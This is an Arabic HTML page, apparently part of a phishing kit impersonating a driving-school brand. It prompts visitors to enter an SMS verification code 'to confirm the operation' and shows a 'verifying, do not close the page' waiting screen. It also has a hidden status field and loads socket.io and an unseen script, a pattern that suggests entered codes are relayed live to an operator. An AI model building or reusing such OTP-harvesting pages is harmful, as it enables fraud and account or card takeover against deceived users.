<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دلة للقيادة</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }
        
        .btn-warning {
            background-color: #D74D1C;
            border-color: #D74D1C;
            height: 50px;
        }
        
        .form-control {
            height: 50px;
        }
        
        /* شاشة الانتظار */
        .waiting-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .waiting-screen.active {
            display: flex;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #D74D1C;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .waiting-text {
            color: #2c3e50;
            font-size: 20px;
            margin-top: 30px;
            text-align: center;
        }
        
        .waiting-text h4 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #D74D1C;
        }
        
        .waiting-text p {
            font-size: 16px;
            opacity: 0.7;
            color: #666;
        }
    </style>
</head>

<body>

    <!-- شاشة الانتظار -->
    <div class="waiting-screen" id="waitingScreen">
        <div class="spinner"></div>
        <div class="waiting-text">
            <h4>جاري التحقق من الكود...</h4>
            <p>يرجى الانتظار، لا تغلق الصفحة</p>
        </div>
    </div>

    <nav class="text-center py-2 shadow-sm">
        <img src="assets/logo.png" width="150" alt="">
    </nav>

    <div class="container my-5">
        <div class="row d-flex justify-content-center">
            <div class="col-11 shadow p-4 my-4" style="border-radius: 15px;">
                <h4 class="text-center fw-bold mb-4">OTP</h4>
                <form id="otpForm" method="post">
                    <h6 class="text-center lh-base mt-4">سيتم إرسال رسالة كود التحقق في خلال دقيقة
لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك</h6>
                    <div class="mt-5 d-flex justify-content-between align-items-center">
                        <label for="" class="fw-bold">رمز التحقق <span id="time" class="me-2 fs-4"></span></label>
                        <input type="text" pattern="[0-9]+" minlength="4" maxlength="6" inputmode="numeric" required name="otp" class="form-control text-center w-50" placeholder="xxxxxx" style="background-color: inherit;">
                        <input type="hidden" name="status" value="3">
                    </div>

                    <button class="btn btn-warning text-light w-100 mt-4 fw-bold mb-3" style="height: 60px !important; border-radius: 12px; font-size: 18px !important;" type="submit">تأكيد</button>
                </form>
            </div>
        </div>
    </div>

   
<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
<script src="js/ind.js"></script>
</body>
</html>
